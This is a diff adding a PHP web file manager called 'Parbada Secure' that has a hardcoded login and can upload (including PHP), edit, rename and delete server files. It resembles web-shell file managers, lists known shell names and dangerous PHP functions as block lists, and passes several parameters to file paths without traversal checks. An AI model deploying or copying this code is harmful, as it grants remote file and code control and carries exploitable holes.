@@ -1,0 +1,598 @@
+<?php
+session_start();
+
+// ====== KONFIGURASI KEAMANAN ======
+define('MAX_LOGIN_ATTEMPTS', 5);
+define('LOCKOUT_TIME', 900); // 15 menit
+define('ALLOWED_EXTENSIONS', ['php', 'html', 'css', 'js', 'txt', 'jpg', 'jpeg', 'png', 'gif', 'svg', 'webp', 'mp3', 'mp4', 'pdf', 'doc', 'docx']);
+define('BLOCKED_FILES', ['malware.php', 'shell.php', 'backdoor.php', 'c99.php', 'r57.php', 'config.php']);
+define('MAX_UPLOAD_SIZE', 5242880); // 5MB
+define('LOG_FILE', 'security.log');
+
+// ====== PASSWORD HASH (TIDAK TERLIHAT) ======
+define('ZPASSWORD_HASH', '$2y$10$UrzYG32SqLpZ6626/e7Fa.roTnlhU5zXa.bqUTl/pTsdlKUJBzFAC'); // password hash
+
+// ====== FUNGSI LOGGING ======
+function securityLog($message, $type = 'INFO') {
+    $log_entry = date('Y-m-d H:i:s') . " | $type | " . $_SERVER['REMOTE_ADDR'] . " | " . $message . PHP_EOL;
+    @file_put_contents(LOG_FILE, $log_entry, FILE_APPEND);
+}
+
+// ====== CEK LOGIN ATTEMPTS ======
+function isLockedOut() {
+    if (isset($_SESSION['login_attempts']) && isset($_SESSION['first_attempt_time'])) {
+        if ($_SESSION['login_attempts'] >= MAX_LOGIN_ATTEMPTS) {
+            $time_elapsed = time() - $_SESSION['first_attempt_time'];
+            if ($time_elapsed < LOCKOUT_TIME) {
+                return true;
+            } else {
+                // Reset attempts setelah lockout habis
+                $_SESSION['login_attempts'] = 0;
+                $_SESSION['first_attempt_time'] = null;
+            }
+        }
+    }
+    return false;
+}
+
+// ====== PROSES LOGIN ======
+if (isset($_GET['logout'])) {
+    session_destroy();
+    securityLog("User logged out", "LOGOUT");
+    header("Location: ?");
+    exit();
+}
+
+if (isset($_POST['login'])) {
+    // Cek lockout
+    if (isLockedOut()) {
+        $remaining = LOCKOUT_TIME - (time() - $_SESSION['first_attempt_time']);
+        $minutes = ceil($remaining / 60);
+        echo "<script>alert('Akun terkunci. Coba lagi dalam $minutes menit!');</script>";
+        securityLog("Login attempt blocked - account locked", "WARNING");
+    } else {
+        // Sanitasi input
+        $username = htmlspecialchars(trim($_POST['username']));
+        $password = htmlspecialchars(trim($_POST['password']));
+        
+        // Verifikasi dengan password_hash (TIDAK MENGGUNAKAN PASSWORD LANGSUNG)
+        if ($username === 'vital' && password_verify($password, ZPASSWORD_HASH)) {
+            $_SESSION['loggedin'] = true;
+            $_SESSION['login_attempts'] = 0;
+            $_SESSION['first_attempt_time'] = null;
+            $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
+            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+            securityLog("Successful login from " . $_SERVER['REMOTE_ADDR'], "SUCCESS");
+        } else {
+            // Catat percobaan gagal
+            if (!isset($_SESSION['login_attempts'])) {
+                $_SESSION['login_attempts'] = 0;
+                $_SESSION['first_attempt_time'] = time();
+            }
+            $_SESSION['login_attempts']++;
+            securityLog("Failed login attempt #" . $_SESSION['login_attempts'] . " from " . $_SERVER['REMOTE_ADDR'], "FAILED");
+            
+            $remaining_attempts = MAX_LOGIN_ATTEMPTS - $_SESSION['login_attempts'];
+            echo "<script>alert('Username atau password salah! Sisa percobaan: $remaining_attempts');</script>";
+        }
+    }
+}
+
+// ====== SESSION VALIDATION ======
+if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    // Validasi IP dan User Agent
+    if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR'] || 
+        $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
+        session_destroy();
+        securityLog("Session hijacking attempt detected", "CRITICAL");
+        header("Location: ?");
+        exit();
+    }
+}
+
+// ====== FORM LOGIN ======
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    // Cek lockout untuk tampilan
+    $lockout_message = '';
+    if (isLockedOut()) {
+        $remaining = LOCKOUT_TIME - (time() - $_SESSION['first_attempt_time']);
+        $minutes = ceil($remaining / 60);
+        $lockout_message = "<div class='alert alert-danger'>Akun terkunci. Coba lagi dalam $minutes menit.</div>";
+    }
+    
+    echo '<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Login - Parbada</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <style>
+            body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+            .card { border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+            .btn-dark { background: #2d3436; border: none; }
+            .btn-dark:hover { background: #636e72; }
+            .password-hint {
+                color: #6c757d;
+                font-size: 12px;
+                margin-top: 5px;
+            }
+        </style>
+    </head>
+    <body class="d-flex justify-content-center align-items-center vh-100">
+        <div class="card p-4" style="width: 350px;">
+            <div class="text-center mb-3">
+                <i class="fas fa-shield-alt" style="font-size: 40px; color: #667eea;"></i>
+                <h3 class="mt-2">🔒 Secure Login</h3>
+                <p class="text-muted small">Sistem file manager terenkripsi</p>
+            </div>
+            ' . $lockout_message . '
+            <form method="POST">
+                <div class="mb-3">
+                    <label class="form-label">Username</label>
+                    <input type="text" class="form-control" name="username" required autofocus>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">Password</label>
+                    <input type="password" class="form-control" name="password" required>
+                    <div class="password-hint">
+                        <i class="fas fa-info-circle"></i> Password terenkripsi (hash)
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-dark w-100" name="login">
+                    <i class="fas fa-sign-in-alt"></i> Login
+                </button>
+            </form>
+            <div class="text-center mt-3">
+                <small class="text-muted">
+                    <i class="fas fa-lock"></i> Koneksi aman
+                </small>
+            </div>
+        </div>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
+    </body>
+    </html>';
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parbada - Secure File Manager</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
+</head>
+<body>
+
+<?php
+// ====== FUNGSI KEAMANAN FILE ======
+function isFileSafe($filename) {
+    // Cek ekstensi
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    if (!in_array($ext, ALLOWED_EXTENSIONS)) {
+        return false;
+    }
+    
+    // Cek nama file terlarang
+    foreach (BLOCKED_FILES as $blocked) {
+        if (stripos($filename, $blocked) !== false) {
+            return false;
+        }
+    }
+    
+    // Cek konten untuk PHP malware
+    if ($ext === 'php' || $ext === 'phtml') {
+        $content = @file_get_contents($filename);
+        if ($content) {
+            $dangerous = ['eval', 'base64_decode', 'system', 'exec', 'shell_exec', 'popen', 'passthru', 'proc_open'];
+            foreach ($dangerous as $func) {
+                if (stripos($content, $func) !== false) {
+                    return false;
+                }
+            }
+        }
+    }
+    
+    return true;
+}
+
+function scanDirectory($dir) {
+    $dangerous_files = [];
+    $files = scandir($dir);
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') continue;
+        $path = $dir . '/' . $file;
+        if (is_file($path) && !isFileSafe($path)) {
+            $dangerous_files[] = $file;
+        }
+    }
+    return $dangerous_files;
+}
+
+function formatSizeUnits($bytes) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = 0;
+    while ($bytes >= 1024 && $i < count($units) - 1) {
+        $bytes /= 1024;
+        $i++;
+    }
+    return round($bytes, 2) . ' ' . $units[$i];
+}
+
+function fileIcon($file) {
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    $icons = [
+        'php' => 'fa-brands fa-php',
+        'html' => 'fa-brands fa-html5',
+        'css' => 'fa-brands fa-css3',
+        'js' => 'fa-brands fa-js',
+        'jpg' => 'fa-regular fa-image',
+        'jpeg' => 'fa-regular fa-image',
+        'png' => 'fa-regular fa-image',
+        'gif' => 'fa-regular fa-image',
+        'svg' => 'fa-regular fa-image',
+        'pdf' => 'fa-regular fa-file-pdf',
+        'doc' => 'fa-regular fa-file-word',
+        'docx' => 'fa-regular fa-file-word',
+        'txt' => 'fa-regular fa-file-lines',
+        'mp3' => 'fa-solid fa-file-audio',
+        'mp4' => 'fa-solid fa-file-video',
+        'zip' => 'fa-regular fa-file-archive',
+        'rar' => 'fa-regular fa-file-archive',
+    ];
+    return isset($icons[$ext]) ? '<i class="' . $icons[$ext] . '"></i> ' : '<i class="fa-regular fa-file"></i> ';
+}
+
+function encodePath($path) {
+    return str_replace(['/', '\\', '.', ':'], ['à¦•', 'à¦–', 'à¦—', 'à¦˜'], $path);
+}
+
+function decodePath($path) {
+    return str_replace(['à¦•', 'à¦–', 'à¦—', 'à¦˜'], ['/', '\\', '.', ':'], $path);
+}
+
+function isPathSafe($path) {
+    // Cegah directory traversal
+    $real = realpath($path);
+    $root = realpath(__DIR__);
+    if ($real === false || strpos($real, $root) !== 0) {
+        return false;
+    }
+    return true;
+}
+
+// ====== CEK FILE BERBAHAYA ======
+$dangerous = scanDirectory(__DIR__);
+if (!empty($dangerous)) {
+    echo '<div class="alert alert-danger m-3">
+        <i class="fas fa-exclamation-triangle"></i> 
+        <strong>PERINGATAN KEAMANAN!</strong> File mencurigakan terdeteksi: 
+        ' . implode(', ', $dangerous) . '
+        <button class="btn btn-danger btn-sm ms-2" onclick="location.href=\'?delete_dangerous=1\'">
+            <i class="fas fa-skull"></i> Hapus
+        </button>
+    </div>';
+}
+
+// ====== HAPUS FILE BERBAHAYA ======
+if (isset($_GET['delete_dangerous'])) {
+    $dangerous = scanDirectory(__DIR__);
+    foreach ($dangerous as $file) {
+        @unlink(__DIR__ . '/' . $file);
+        securityLog("Deleted dangerous file: $file", "SECURITY");
+    }
+    echo "<script>alert('File berbahaya telah dihapus!'); location.href='?';</script>";
+}
+
+// ====== NAVIGASI ======
+$root_path = __DIR__;
+if (isset($_GET['p'])) {
+    if (empty($_GET['p'])) {
+        $p = $root_path;
+    } else {
+        $decoded = decodePath($_GET['p']);
+        if (isPathSafe($decoded) && is_dir($decoded)) {
+            $p = $decoded;
+        } else {
+            securityLog("Invalid path access: " . $_GET['p'], "WARNING");
+            $p = $root_path;
+        }
+    }
+} else {
+    $p = $root_path;
+}
+define("PATH", $p);
+
+// ====== NAVBAR ======
+echo '
+<nav class="navbar navbar-dark" style="background: linear-gradient(135deg, #2d3436 0%, #636e72 100%);">
+  <div class="container-fluid">
+    <a class="navbar-brand" href="?">
+      <i class="fas fa-shield-alt"></i> Parbada Secure
+    </a>
+    <div class="d-flex">
+      <a href="?upload&q=' . urlencode(encodePath(PATH)) . '" class="btn btn-light btn-sm me-2">
+        <i class="fas fa-upload"></i> Upload
+      </a>
+      <a href="?' . (isset($_GET['p']) ? 'p=' . urlencode(encodePath(PATH)) : '') . '" class="btn btn-light btn-sm me-2">
+        <i class="fas fa-home"></i> Home
+      </a>
+      <a href="?logout" class="btn btn-danger btn-sm">
+        <i class="fas fa-sign-out-alt"></i> Logout
+      </a>
+    </div>
+  </div>
+</nav>';
+
+// ====== BREADCRUMB ======
+echo '<div class="container mt-3">
+    <nav aria-label="breadcrumb">
+        <ol class="breadcrumb">';
+$path_parts = explode('/', str_replace('\\', '/', PATH));
+$current = '';
+echo '<li class="breadcrumb-item"><a href="?p=/"><i class="fas fa-home"></i></a></li>';
+foreach ($path_parts as $part) {
+    if (empty($part)) continue;
+    $current .= '/' . $part;
+    echo '<li class="breadcrumb-item"><a href="?p=' . urlencode(encodePath($current)) . '">' . htmlspecialchars($part) . '</a></li>';
+}
+echo '</ol></nav></div>';
+
+// ====== FILE MANAGER ======
+echo '<div class="container">';
+
+if (isset($_GET['p'])) {
+    if (is_readable(PATH)) {
+        $items = scandir(PATH);
+        $folders = [];
+        $files = [];
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = PATH . '/' . $item;
+            if (is_dir($path)) {
+                $folders[] = $item;
+            } elseif (is_file($path)) {
+                $files[] = $item;
+            }
+        }
+        
+        echo '<table class="table table-hover table-striped mt-3">
+            <thead class="table-dark">
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Modified</th>
+                    <th>Perms</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody>';
+        
+        foreach ($folders as $folder) {
+            $path = PATH . '/' . $folder;
+            $is_safe = isPathSafe($path);
+            echo "<tr>
+                <td><i class='fas fa-folder text-warning'></i> 
+                    <a href='?p=" . urlencode(encodePath($path)) . "'>" . htmlspecialchars($folder) . "</a>
+                </td>
+                <td>---</td>
+                <td>" . date("Y-m-d H:i:s", filemtime($path)) . "</td>
+                <td>" . substr(decoct(fileperms($path)), -3) . "</td>
+                <td>
+                    <a href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($folder) . "' title='Rename' class='text-primary'>
+                        <i class='fas fa-pen'></i>
+                    </a>
+                    <a href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($folder) . "' title='Delete' class='text-danger' onclick='return confirm(\"Hapus folder ini?\")'>
+                        <i class='fas fa-trash'></i>
+                    </a>
+                </td>
+            </tr>";
+        }
+        
+        foreach ($files as $file) {
+            $path = PATH . '/' . $file;
+            $is_safe = isFileSafe($path);
+            echo "<tr>
+                <td>" . fileIcon($file) . " " . htmlspecialchars($file);
+                if (!$is_safe) {
+                    echo ' <span class="badge bg-danger"><i class="fas fa-exclamation-triangle"></i> Unsafe</span>';
+                }
+                echo "</td>
+                <td>" . formatSizeUnits(filesize($path)) . "</td>
+                <td>" . date("Y-m-d H:i:s", filemtime($path)) . "</td>
+                <td>" . substr(decoct(fileperms($path)), -3) . "</td>
+                <td>
+                    <a href='?q=" . urlencode(encodePath(PATH)) . "&e=" . urlencode($file) . "' title='Edit' class='text-success'>
+                        <i class='fas fa-edit'></i>
+                    </a>
+                    <a href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($file) . "' title='Rename' class='text-primary'>
+                        <i class='fas fa-pen'></i>
+                    </a>
+                    <a href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($file) . "' title='Delete' class='text-danger' onclick='return confirm(\"Hapus file ini?\")'>
+                        <i class='fas fa-trash'></i>
+                    </a>
+                    <a href='" . htmlspecialchars($path) . "' title='Download' class='text-info' target='_blank'>
+                        <i class='fas fa-download'></i>
+                    </a>
+                </td>
+            </tr>";
+        }
+        
+        echo '</tbody></table>';
+    }
+}
+
+// ====== UPLOAD ======
+if (isset($_GET['upload'])) {
+    echo '
+    <div class="card mt-3">
+        <div class="card-header bg-dark text-white">
+            <i class="fas fa-upload"></i> Upload File
+        </div>
+        <div class="card-body">
+            <form method="post" enctype="multipart/form-data">
+                <div class="mb-3">
+                    <input type="file" class="form-control" name="fileToUpload" id="fileToUpload" required>
+                    <small class="text-muted">Maksimal 5MB. Ekstensi yang diizinkan: ' . implode(', ', ALLOWED_EXTENSIONS) . '</small>
+                </div>
+                <button type="submit" class="btn btn-dark" name="upload">
+                    <i class="fas fa-cloud-upload-alt"></i> Upload
+                </button>
+            </form>
+        </div>
+    </div>';
+}
+
+// ====== PROSES UPLOAD ======
+if (isset($_POST["upload"])) {
+    if ($_FILES["fileToUpload"]["error"] === UPLOAD_ERR_OK) {
+        $filename = basename($_FILES["fileToUpload"]["name"]);
+        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+        $filesize = $_FILES["fileToUpload"]["size"];
+        
+        // Validasi ekstensi
+        if (!in_array($ext, ALLOWED_EXTENSIONS)) {
+            echo "<div class='alert alert-danger'>Ekstensi file tidak diizinkan!</div>";
+            securityLog("Blocked upload: $filename (invalid extension)", "SECURITY");
+        }
+        // Validasi ukuran
+        elseif ($filesize > MAX_UPLOAD_SIZE) {
+            echo "<div class='alert alert-danger'>Ukuran file terlalu besar! Maksimal 5MB.</div>";
+            securityLog("Blocked upload: $filename (too large - $filesize bytes)", "SECURITY");
+        }
+        // Validasi nama file
+        elseif (in_array($filename, BLOCKED_FILES)) {
+            echo "<div class='alert alert-danger'>Nama file tidak diizinkan!</div>";
+            securityLog("Blocked upload: $filename (blocked filename)", "SECURITY");
+        }
+        else {
+            $target_file = PATH . "/" . $filename;
+            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+                echo "<div class='alert alert-success'>File " . htmlspecialchars($filename) . " berhasil diupload!</div>";
+                securityLog("File uploaded: $filename to " . PATH, "INFO");
+                
+                // Scan ulang setelah upload
+                if (!isFileSafe($target_file)) {
+                    @unlink($target_file);
+                    echo "<div class='alert alert-danger'>File mengandung kode berbahaya dan telah dihapus!</div>";
+                    securityLog("Deleted malicious file: $filename", "SECURITY");
+                }
+            } else {
+                echo "<div class='alert alert-danger'>Gagal mengupload file!</div>";
+                securityLog("Upload failed: $filename", "ERROR");
+            }
+        }
+    } else {
+        echo "<div class='alert alert-danger'>Error upload: " . $_FILES["fileToUpload"]["error"] . "</div>";
+    }
+}
+
+// ====== RENAME ======
+if (isset($_GET['r']) && isset($_GET['q'])) {
+    $old_name = PATH . "/" . $_GET['r'];
+    echo '
+    <div class="card mt-3">
+        <div class="card-header bg-dark text-white">
+            <i class="fas fa-pen"></i> Rename
+        </div>
+        <div class="card-body">
+            <form method="post">
+                <div class="mb-3">
+                    <input type="text" class="form-control" name="name" value="' . htmlspecialchars($_GET['r']) . '" required>
+                </div>
+                <button type="submit" class="btn btn-dark" name="rename">
+                    <i class="fas fa-save"></i> Rename
+                </button>
+            </form>
+        </div>
+    </div>';
+    
+    if (isset($_POST['rename'])) {
+        $new_name = PATH . "/" . basename($_POST['name']);
+        // Validasi nama baru
+        if (in_array(basename($_POST['name']), BLOCKED_FILES)) {
+            echo "<div class='alert alert-danger'>Nama file tidak diizinkan!</div>";
+        } elseif (rename($old_name, $new_name)) {
+            securityLog("Renamed: " . $_GET['r'] . " to " . $_POST['name'], "INFO");
+            echo "<script>alert('Berhasil di-rename!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>";
+        } else {
+            echo "<div class='alert alert-danger'>Gagal rename!</div>";
+        }
+    }
+}
+
+// ====== EDIT ======
+if (isset($_GET['e']) && isset($_GET['q'])) {
+    $filepath = PATH . "/" . $_GET['e'];
+    if (isFileSafe($filepath)) {
+        echo '
+        <div class="card mt-3">
+            <div class="card-header bg-dark text-white">
+                <i class="fas fa-edit"></i> Edit File: ' . htmlspecialchars($_GET['e']) . '
+            </div>
+            <div class="card-body">
+                <form method="post">
+                    <div class="mb-3">
+                        <textarea class="form-control" style="height: 400px; font-family: monospace;" name="data">' . htmlspecialchars(file_get_contents($filepath)) . '</textarea>
+                    </div>
+                    <button type="submit" class="btn btn-dark" name="edit">
+                        <i class="fas fa-save"></i> Save
+                    </button>
+                </form>
+            </div>
+        </div>';
+        
+        if (isset($_POST['edit'])) {
+            $data = $_POST['data'];
+            // Cek jika ada kode berbahaya
+            $dangerous = ['eval', 'base64_decode', 'system', 'exec', 'shell_exec'];
+            foreach ($dangerous as $func) {
+                if (stripos($data, $func) !== false) {
+                    echo "<div class='alert alert-danger'>Kode berbahaya terdeteksi! Tidak dapat menyimpan.</div>";
+                    securityLog("Blocked editing: " . $_GET['e'] . " contains dangerous code", "SECURITY");
+                    exit();
+                }
+            }
+            
+            if (file_put_contents($filepath, $data) !== false) {
+                securityLog("File edited: " . $_GET['e'], "INFO");
+                echo "<script>alert('Berhasil disimpan!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>";
+            } else {
+                echo "<div class='alert alert-danger'>Gagal menyimpan!</div>";
+            }
+        }
+    } else {
+        echo "<div class='alert alert-danger'>File tidak aman untuk diedit!</div>";
+    }
+}
+
+// ====== DELETE ======
+if (isset($_GET['d']) && isset($_GET['q'])) {
+    $target = PATH . "/" . $_GET['d'];
+    if (is_file($target)) {
+        if (unlink($target)) {
+            securityLog("Deleted file: " . $_GET['d'], "INFO");
+            echo "<script>alert('File berhasil dihapus!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>";
+        }
+    } elseif (is_dir($target)) {
+        // Cek apakah folder kosong
+        if (count(scandir($target)) == 2) {
+            if (rmdir($target)) {
+                securityLog("Deleted directory: " . $_GET['d'], "INFO");
+                echo "<script>alert('Folder berhasil dihapus!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>";
+            }
+        } else {
+            echo "<div class='alert alert-danger'>Folder tidak kosong! Hapus isinya terlebih dahulu.</div>";
+        }
+    }
+}
+
+echo '</div>';
+?>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
